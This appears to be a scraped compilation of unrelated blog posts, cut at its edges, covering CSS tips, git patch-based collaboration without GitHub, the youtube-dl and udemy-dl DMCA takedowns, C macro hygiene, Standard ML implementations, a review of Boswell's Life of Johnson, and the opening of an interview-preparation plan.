title="https://forms.gle/tXRMnpyUZiFmvZwK8" href="https://forms.gle/tXRMnpyUZiFmvZwK8">How To Debug CSS</a>.</p><h3>Master layouts and positioning in CSS (the most tedious aspect of it)</h3><p>As a follow-on to the above point on simply gaining an understanding of the most common aspects of the CSS writing process, the most common of these in terms of general page creation, is that of simply layout out a page, and its elements and making sure that they are positioned and aligned properly. </p><p>The best way to approach problems in a way that solves them most effectively is in an 80/20 way. Mastery of layouts and positioning is the 20% that leads to the 80% of results with CSS. And what will have the most dramatic effect on reducing the tediousness of your CSS writing process.</p><p>Using tools such as Flexbox, as is mentioned above, also makes layouts and positioning twice as easy, once you understand the fundamentals behind it. </p><p>Overall, it’s with this knowledge that you may start to enjoy and view the process as ‘constructing’ pages, rather than simply ‘styling’ them.</p><h3>Practice regularly until it becomes second nature</h3><p>One simple thing that I found, as I started to implement some of the tactics above into my own workflow, was that as I became more proficient in writing CSS and it started to become second nature, my enjoyment of it also started to increase, which lead to a positive feedback loop that kept increasing my overall ability.</p><p>This is a very positive flywheel that I highly encourage. Once you’ve started to change your mindset about CSS and use the right tools to abstract a lot of the tediousness out of it, practicing it regularly is then like adding jet fuel to your workflow. Eventually, CSS will become something you look forward to, rather than an afterthought that you try to avoid.</p></div></div>]]>

October 25, 2020 | https://tarunbatra.com/blog/x/git-before-github/ | <a href="https://web.archive.org/web/*/https://tarunbatra.com/blog/x/git-before-github/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Back when I was studying CS at university, we had assignments to code various algorithms. When the assignments were due we were supposed to execute the code in laboratory systems and get the output checked by the professors. I liked coding and tinkering with the algorithms; some of my classmates didn’t. They used to copy the code from my system on a USB stick and execute them on their system and get done with it. I didn’t judge them but I was tired of giving each one their copy and sometimes also instructing them how to execute that piece of code. In one such assignment, I uploaded the code on GitHub and shared the <a href="https://github.com/tarunbatra/re2nfa" target="_blank" rel="noopener">link</a> with anybody who asked. <strong>Unknowingly, I had made my first open source contribution.</strong></p>
<p>A lot of people have similar stories and for most, Github is synonymous with Open Source. One thing that is also used interchangeably with Github is git. Even though these are three different entities, a lot of developers including me have never contributed to open source or used git without Github. Thus I was surprised when I learned that famous open source projects like Linux were not on Github even though they used git. Also, git was around before Github, so there must be other more native ways in git to get things done. I wondered how it worked but didn’t do anything about it until recently when I decided to experience a git only development workflow.</p>
<h2 id="Git-server-access"><a href="#Git-server-access" title="Git server access"></a>Git server access</h2><p>We use version control systems broadly for two use cases – to contribute to a repository where we have write access; to contribute to a public repository where we don’t have write access. To collaborate with developers to whom access can be given, Github or other platforms are not necessary. Anybody can host a <a href="https://git-scm.com/book/en/v2/Git-on-the-Server-Setting-Up-the-Server" target="_blank" rel="noopener">Git server</a> that can be used to host repositories. Developers can clone, push to, and pull from these remote repositories once access is granted to their ssh identity.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git clone origin git@&lt;host&gt;/&lt;repo&gt;.git</span><br></pre></td></tr></tbody></table></figure>

<p>This is similar to how we upload our SSH keys to Github or other platforms for being able to clone the repositories using SSH.</p>
<h2 id="Pull-requests"><a href="#Pull-requests" title="Pull requests"></a>Pull requests</h2><p>One thing which is missing in the above-mentioned method is the ability to create Pull Requests, get them reviewed and merged into the code. It becomes a big issue when the developers don’t have write access to the repositories as is the case in open source development. General open source flow is to fork a repository, push the changes in your forked repositories, and create a <strong>pull request</strong> to the original repository from where the maintainers can review and merge. Pull request is not a feature of git, but of platforms like Github. Collaborative development in git has the following steps:</p>
<ol>
<li>Clone the original repository</li>
<li>Create a patch</li>
<li>Send the patch to the maintainer</li>
<li>The maintainer applies the patch and pushes the code</li>
</ol>
<p>We introduced two new processes in this workflow – creating a patch and applying a patch. Let’s discuss them further.</p>
<hr>
<h3 id="Patch"><a href="#Patch" title="Patch"></a>Patch</h3><p>A patch is a diff of code and metadata around it. A diff is the actual code change which can be viewed using the command <code>git diff</code>. It is a Unix concept that is way older than git and Unix systems even have a builtin tool, <a href="https://man7.org/linux/man-pages/man1/diff.1.html" target="_blank" rel="noopener"><code>diff</code></a> which compares changes between two files. Its output can then be saved to a file that can be processed by another utility tool called <code>patch</code> which updates one of the files to make its content identical to another file.</p>

<p>If we want to update the original file with the contents of the new one, we need to “patch” it.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>patch original.txt changes.patch</span><br></pre></td></tr></tbody></table></figure>
<p><strong>NOTE:</strong> <em>Use <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github repository</a> to practice this example and all the ones which are to follow.</em></p>
<p>Now that we understand the concepts of diff and patch, we can proceed with using them in git. To generate a patch file in git, we need to use <code>git format-patch</code> command.</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git format-patch HEAD~1..HEAD</span><br></pre></td></tr></tbody></table></figure>

<p>This will create a patch file for the latest commit. Tinker with the argument to produce patch files for other commits too. By default, each file represents a single commit and the file name is of the format <code>0001-&lt;commit message&gt;.patch</code>. Interestingly, it is in <a href="https://en.wikipedia.org/wiki/Mbox" target="_blank" rel="noopener">Unix mbox</a> format which means it has some email-like metadata (from, subject, etc.) followed by the patch data.</p>

<p>This is the patch file I created to add my name to the contributors’ list of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository as an exercise for myself.</p>
<hr>
<h3 id="Apply"><a href="#Apply" title="Apply"></a>Apply</h3><p>We have a patch file which we can send to the maintainers so that they can apply the patch. We can either use traditional ways to send the patch or use git itself, but more on it later. In this section, we will explore the process to apply a patch.</p>
<p><code>git apply &lt;patch file&gt;</code> is a command which applies the changes described in the patch file locally but does not commit them. They will appear in our workspace and we can stage them and commit them. This is not ideal as even though we get the changes, the commit metadata like author name and message is lost. A better way to apply patches is <code>git am</code> (abbrev. for “apply mailbox”).</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git am --signoff &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>The flag <code>--signoff</code> is used if the commit message needs to be appended with a “Signed-off-by” line to indicate who applied the commit. Below is the signed-off and applied commit for the patch we generated as an exercise in the last section.</p>

<hr>
<h3 id="Sending-the-patch"><a href="#Sending-the-patch" title="Sending the patch"></a>Sending the patch</h3><p>Now we can explore how to send a patch file to a maintainer in the “git” way. There are two ways that I know of –</p>
<ol>
<li><p>imap-send</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git imap-send &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will upload the email to an IMAP folder from where it can be sent. To use it we need to add IMAP server details in our <code>~/.gitconfig</code> file. I use Gmail so my IMAP details look like:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></pre></td><td><pre><span><span>[imap]</span></span><br><span>	folder = "[Gmail]/Drafts"</span><br><span>	host = imaps://imap.gmail.com</span><br><span>	user = email@gmail.com</span><br><span>	pass = yourpassword</span><br><span>	port = 993</span><br></pre></td></tr></tbody></table></figure>
<p>Gmail allows its IMAP server to be used if the <a href="https://myaccount.google.com/lesssecureapps" target="_blank" rel="noopener">Less secure app access</a> setting is turned on.</p>
</li>
<li><p>send-email</p>
<figure><table><tbody><tr><td><pre><span>1</span><br></pre></td><td><pre><span>git send-email --to=&lt;email&gt; &lt;patch file&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>It will use an SMTP server to send email. The corresponding config to use this command is:</p>
<figure><table><tbody><tr><td><pre><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></pre></td><td><pre><span><span>[sendemail]</span></span><br><span>	smtpEncryption = tls</span><br><span>	smtpServer = &lt;host&gt;</span><br><span>	smtpUser = &lt;user&gt;</span><br><span>	smtpServerPort = 587</span><br></pre></td></tr></tbody></table></figure>
<p>Both of these methods can be used to send an email per patch file. The subject of the commit by default is of the format <code>[PATCH] &lt;commit message&gt;</code>.</p>
</li>
</ol>
<p><strong>NOTE:</strong> <em>Sender email addresses can be spoofed quite easily and this raises the question of authentication and authorization when submitting patches. I tried creating patches of PGP signed git commits but the patch doesn’t retain the PGP signature. We could encrypt the email itself using PGP but that’s a lot of extra work for both the contributor and the maintainer.</em></p>
<p>So what can we do with this newly acquired knowledge?</p>
<ol>
<li>Git patches often <a href="https://lkml.org/lkml/2020/10/16/629" target="_blank" rel="noopener">float</a> <a href="https://lkml.org/lkml/2020/10/19/82" target="_blank" rel="noopener">around</a> in the Linux development mailing list and it gives me satisfaction that I understand how they work a little better now than before.</li>
<li>When platforms like Github and Gitlab have an outage, work in most of the development teams stall. Now I know a way to get my code reviewed even in these situations. (Okay, that might be a stretch)</li>
<li>EDIT: About when this article was published, <a href="https://yt-dl.org/about.html" target="_blank" rel="noopener"><code>youtube-dl</code></a> was taken down by Github due to <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md" target="_blank" rel="noopener">a DMCA request</a>. The whole episode brings to light that Github being a platform is subject to censorship, unlike git which is distributed.</li>
</ol>
<p>You can practice for yourself by adding your name to the <code>CONTRIBUTORS.txt</code> file of the <a href="https://github.com/tarunbatra/git-before-github" target="_blank" rel="noopener">git-before-github</a> repository, committing it, and then sending me the patch. I would readily <del>merge</del> apply it. 😀</p>

October 25, 2020 | https://funnelfiasco.com/blog/2020/10/25/youtube-dl-github-riaa/ | <a href="https://web.archive.org/web/*/https://funnelfiasco.com/blog/2020/10/25/youtube-dl-github-riaa/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Earlier this week, <a href="https://www.zdnet.com/article/riaa-blitz-takes-down-18-github-projects-used-for-downloading-youtube-videos/">GitHub took down the repository</a> for the youtube-dl project. This came in response to a request from the RIAA—the recording industry’s lobbying and harassment body. youtube-dl is a tool for downloading videos. The RIAA argued that this violates the anticircumvention protections of the Digital Millennium Copyright Act (DMCA). While GitHub taking down the repository and its forks is true to the principle of minimizing corporate risk, it’s the wrong choice.</p>



<p> Microsoft—currently the world’s second-most valuable company with a market capitalization of $1.64 trillion—owns GitHub. If anyone is in a position to fight back on this, it’s Microsoft. Microsoft’s lawyers should have a one word answer to the RIAA’s request: “no”. <em>(full disclosure: I own a small number of shares of Microsoft)</em></p>



<h2>The procedural argument</h2>



<p>The first reason to tell the RIAA where to stick it is procedural. The RIAA isn’t arguing that youtube-dl is infringing its copyrights or circumventing its protections. It is arguing that youtube-dl infringes YouTube’s protections. So even if it is, that’s YouTube’s problem, not the RIAA’s.</p>



<h2>The factual argument</h2>



<p>I have some sympathy for the anticircumvention argument. I’m not familiar with the specifics of how youtube-dl works, but it’s at least possible that youtube-dl circumvents YouTube’s copy protection. This would be a reasonable basis for YouTube to take action. Again, YouTube, not the RIAA.</p>



<p>I have less sympathy for the infringement argument. youtube-dl doesn’t induce infringement more than a web browser or screen recorder does. There are a variety of uses for youtube-dl that are not infringing. Foremost is the fact that some YouTube videos are under a license that explicitly allows sharing and remixing. Archivers use it to archive content. Some people who have time-variable Internet billing use it to download videos overnight.</p>



<p>So, yes, youtube-dl can be used to infringe the RIAA’s copyrights. It can also be used for non-infringing purposes. The code itself does not infringe. There’s nothing about it that gives the RIAA a justification to take it down.</p>



<h2>youtube-dl isn’t the whole story</h2>



<p>youtube-dl provides a focal point, but there’s more to it. Copyright law is now used to suppress instead of promote creative works. The DMCA, in particular, favors the large rightsholders over smaller developers and creators. It essentially forces sites to act on a “guilty until proven innocent” model. Companies in a position to push back have an obligation to do so. Microsoft has become a supporter of open source, now it’s time to show they mean it.</p>



<p>We should also consider the risks of consolidation. git is a decentralized system. GitHub has essentially centralized it. Sure, many competitors exist, but GitHub has become the default place to host open source code projects. The fact that GitHub’s code is proprietary is immaterial to this point. A FOSS service would pose the same risk if it became the centralized service.</p>



<p>I saw a quote on this discussion (which I can’t find now) that said “code is free, infrastructure is not.” And while projects self-hosting their code repository, issue tracker, etc may be philosophically appealing, that’s not realistic. Software-as-a-Service has lowered the barrier for starting projects, which is a good thing. But it doesn’t come without risk, which we are now seeing.</p>



<p>I don’t know what the right answer is for this. I know the answer won’t be easy. But both this specific case and the general issues they highlight are important for us to think about.</p>

	<div>
		
<p>C is a fascinating programming language. For me, it is a particularly beautiful language, because it gives my blog the right to exist.</p>



<p>The C-standard is fine, but it falls short in many respects. It is a very non-committal standard and leaves a lot to the compiler itself. Large compilers such as gcc and clang have clear and useful specifications for this, which means that as a developer you rarely have any problems with this.</p>



<p>However, there are also things that cannot be solved for you by a clever compiler. That is something you really have to think about for yourself. One of those things: macros.</p>



<p>If you regularly work with C, you are used to macros. Especially if you sometimes look at larger C programmes. The larger a program becomes, the more essential a macro can become.</p>



<p>If you are not familiar with macros: this is how they can be used:</p>


<pre title="">#define macro(x)  foo(x); bar(x)
</pre>


<p>The consequence of this macro is that you can do this:</p>


<pre title="">macro(arg);
</pre>


<p>Which results in the following line:</p>


<pre title="">foo(arg); bar(arg);
</pre>


<p>So far, so good. From here on, however, things are only going downhill. Let’s look at another example:</p>


<pre title="">if (test)
    macro(arg);
</pre>


<p>This expands into:</p>


<pre title="">if (test)
    foo(arg);
bar(arg);
</pre>


<p>So now we have a problem. This macro does not behave as you would expect from a function. This is not so strange, because a macro is not a function. All it does is replace text with other text.</p>



<p>We can, of course, place curly braces around our functions to tackle this problem.</p>


<pre title="">#define macro(x)  { foo(x); bar(x); }
</pre>


<p>Now our problem has been solved! Look what is happening with our previous example!</p>


<pre title="">if (test)
{
    foo(arg);
    bar(arg);
};
</pre>


<p>However, there are also problems to be imagined in this respect. How about this?</p>


<pre title="">if (test)
    macro(arg);
else
    printf("This failed. :(");
</pre>


<p>This will result in the following code block:</p>


<pre title="">if (test)
{
    foo(arg);
    bar(arg);
};
else
    printf("This failed. :(");
</pre>


<p>Because of the <code>};</code> before <code>else</code>, this is no longer valid code.</p>



<p>So, how do we solve this? We need a way to ensure that everything after the macro identifier is correctly interpreted. Fortunately, there is a way to do that:</p>


<pre title="">#define macro(x) do { foo(x); bar(x); } while(0)
</pre>


<p>If we use this macro now in our previous example, we get:</p>


<pre title="">if (test)
    do {
        foo(arg); bar(arg);
    } while(0);
else
    printf("This failed. :(");
</pre>


<p>And with that we have found a solution.</p>

October 25, 2020 | https://gaganpreet.in/blog/2020/10/25/udemy-dl-story/ | <a href="https://web.archive.org/web/*/https://gaganpreet.in/blog/2020/10/25/udemy-dl-story/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody">
    <p>The recent takedown of the <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">youtube-dl</a> project resurfaced memories of a similar project, udemy-dl, that I worked on years ago. I also had to abandon the project due to a DMCA notice. In light of what happened to youtube-dl this felt like the right time to write about it.</p>
<h2 id="beginnings">Beginnings</h2>
<p>Back in 2013 when I was starting off as a software consultant, I landed a project to build a desktop GUI application. I found a Udemy course for Python GUI development using Qt. After I started the course I ran into an obstacle. My internet was awful. It was slow (4 Mb/s, if I remember correctly) and disconnected frequently making streaming videos a painful experience.</p>
<p>A look at the network console in the browser made me realise I could throw together a quick scraper for the script.</p>
<p>And so I did. I wrote a Python script to fetch the course data and video URLs from the undocumented Udemy JSON API, and download the videos locally. Finally I could follow the videos in VLC at my leisure.</p>
<p>It was only some time later I realised that youtube-dl also supported downloading from Udemy. However, youtube-dl could only download a single video from one page at a time. udemy-dl could download and make a whole course offline, a big improvement.</p>
<p>I put my work online, with a name inspired by youtube-dl. I hosted the sources on <a href="https://github.com/gaganpreet/udemy-dl">Github</a> and packages on <a href="https://pypi.org/project/udemy-dl/">PyPi</a>. That was it. I never advertised udemy-dl or created a website (except for a readme on Github).</p>
<h2 id="gaining-momentum">Gaining momentum</h2>
<p>Turns out I wasn’t the only one who wanted to have an offline copy of their lectures. A year or so after the project was first published online, there was a gradual uptick in number of Github stars.</p>
<p>I also started receiving emails from users of the tool. Many looking for help with a particular issue and some thanking me for the project. I had stopped using the Udemy platform itself by this time since I wasn’t following any courses, and was only a maintainer.</p>
<h2 id="gaining-notoriety">Gaining notoriety</h2>
<p>I discovered that the tool was being used to provide unauthorized copies of courses. The tool was always meant for personal use, and unfortunately I had no control if users respected that.</p>
<p>I also learned of a loophole when someone made a feature request to add to the tool. Udemy offered a free 5 minute preview where all course content was accessible. This trial period could be used to download the course without having to pay.</p>
<p>This feature never made it to the project. Later I came across modified copies of the tool which did this: sign up for a course and quickly download the content within this short window.</p>
<p>In April 2015 I received a gently worded email from Udemy telling me that the project was being used for piracy and if I’d be willing to take down the tool altogether. I didn’t want to do that and I ignored the email. In retrospect, I could have replied and elaborated on my standpoint about why I wouldn’t do that. I doubt that would have helped at all.</p>
<p>I didn’t expect the project to go away. youtube-dl also existed, a much bigger project could also download Udemy videos. I presumed udemy-dl would always be around as long as youtube-dl.</p>
<h2 id="takedown">Takedown</h2>
<p>One fine day later in the summer of 2015, I woke up to a DMCA email from Github informing me of the takedown notice sent by Udemy. For a while afterwards I wanted to respond to the DMCA. The <a href="https://github.com/github/dmca/blob/master/2015/2015-08-12-Udemy.md">DMCA notice</a> centered around the point that the project I created, maintained and released to public domain was a property of Udemy, a completely wrong claim.</p>
<p>Unfortunately I had no idea where to start off with responding to a DMCA. My knowledge of American law, as an outsider was (and still is) nil. Due to other personal circumstances at the time and the fact that I was solely maintaining the project (and not using it), I gave up on the idea. The ownership of the project was forked/taken over by a former regular contributor (that fork was again taken down a few years later with a similar DMCA notice).</p>
<h2 id="why-it-matters">Why it matters</h2>
<p>udemy-dl served a great need for me and many others. Being able to watch videos and learn the way I wanted without having to be online or without opening a browser was the reason it existed and became popular. A platform which purpots to make education accessible, didn’t like a piece of code which served the same purpose.</p>
<p>youtube-dl was the latest victim. Apart from software projects, it’s not uncommon to have videos on Youtube taken down by the greedy claws of the music industry. So unfair that there exists a <a href="https://en.wikipedia.org/wiki/YouTube_copyright_issues">Wikipedia</a> page about the issue.</p>
<p>What has always troubled me is that a law as powerful as DMCA is used to intimidate all too often, with no easy recourse for the receiver. The law has provisions for unauthorized use, but good luck if you are an indie creator going up against a corporation.</p>
<p>youtube-dl is a huge loss because of the number of websites it supported, with many of the websites having unusable interfaces. I’m certain that youtube-dl will live on, but it’s on Github where it had a huge community which has now been scattered. And I hope we don’t lose this community forever.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <p>Incredibly, Standard ML implementations are still actively
developed. <a href="http://mlton.org/">MLton</a>, <a href="https://polyml.org/">Poly/ML</a>,
<a href="https://elsman.com/mlkit/">MLKit</a>,
<a href="https://www.pllab.riec.tohoku.ac.jp/smlsharp/">SML#</a> and
<a href="http://smlnj-gforge.cs.uchicago.edu/scm/viewvc.php/?root=smlnj">SML/NJ</a>
are the most prominent. Discussion on the future direction of Standard
ML <a href="https://github.com/SMLFamily/Successor-ML/issues">remains healthy as
well</a>.</p>
<p>And somehow OCaml's lesser known cousin still beats out OCaml for
multicore threading support (in Poly/ML).</p>
<p>While MLton hasn't merged with
<a href="https://github.com/kayceesrk/multiMLton">MultiMLton</a> or
<a href="https://github.com/UBMLtonGroup/RTMLton">RTMLton</a> to support
multicore, a <a href="https://github.com/mpllang/mpl">new fork of MLton with
parallelism</a> is pretty far along and
in active development at CMU.</p>
<p>
  A commentor shared
  <a href="https://github.com/ManticoreProject/manticore">Manticore</a>,
  another implementation with parallelism support in active
  development at UChicago.
</p><p>Furthermore, the last few years have welcomed some entirely new
implementations. <a href="https://github.com/KeenS/webml">WebML</a>, by a
prominent open source hacker, is written in Rust and compiles Standard
ML to WebAssembly. <a href="https://sosml.org/">SOSML</a> is an interpreter
written in TypeScript by former students of Saarland University. It
features <a href="https://sosml.org/editor">a nifty online
IDE</a>.</p>
<p>
  A commenter
  shared <a href="https://github.com/SomewhatML/sml-compiler">SomewhatML</a>,
  an actively developing compiler for Standard ML written in Rust.
</p><p>There have also been some new experimental spins on Standard ML in
the last few years. <a href="https://github.com/julianhyde/morel">Morel</a> is an
interpreter with some nice syntax extensions written in Java by the
author of Apache Calcite. And <a href="https://github.com/elpinal/bright-ml">Bright
ML</a> is a spin on Standard ML and
OCaml written in Standard ML (and using the abandoned <a href="https://mosml.org/">Moscow
ML</a> compiler of all implementations).</p>
<p>So if you're looking for an easy intro to the ML family of languages,
I still recommend the simplicity and performance of Standard ML and
its small but definitely, surprisingly, not dead community. :)</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn2189487741" rel="footnote"><sup id="fnref2189487741">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn2189487742" rel="footnote"><sup id="fnref2189487742">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn2189487743" rel="footnote"><sup id="fnref2189487743">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn2189487744" rel="footnote"><sup id="fnref2189487744">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn2189487745" rel="footnote"><sup id="fnref2189487745">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>

          <p>This interview preparation plan contains notes that apply to any company and specifics for my target companies.
I planned to interview with my target companies Airbnb, Facebook, and Google at once. I wanted to have the onsites close to each other (with at
least one day to rest between interviews) to maximize my chances to get into a big company.
I got excellent recruiters that helped me schedule the 3 on-sites in 2 weeks.
I was able to pass all of the Hiring Committees and got offers from Airbnb, Facebook, and Google.
Disclaimer: <em>This plan worked for me. It might or might not work for you</em>.</p>

<h2 id="before-you-start">Before you start</h2>
<p><strong>Preparing</strong> for an interview is a rewarding, stressful, and exciting experience. Passing an interview could be the outcome of enough focused preparation
(luck is involved too, but I’ll get to this shortly).
The process is stressful on every single stage from the first time you send your resume and wait for the automated program or the recruiter not to reject it
until the last day you negotiate your offer with your recruiter. However, the process is rewarding because you improve your problem-solving skills, also,
the concepts that you learn when you’re preparing for the system design interviews are invaluable and will be helpful throughout your career.</p>
<p><strong>Luck is involved in the interview process</strong>. You may have prepared a lot but:</p>
<ul>
<li>you might get stage fright during the interview, you can decrease the anxiety effect with enough practice, but I guess that this feeling will always be there</li>
<li>you might be unable to make progress because the problem is too hard to solve because you didn’t practice that topic enough, or you just missed that small insight</li>
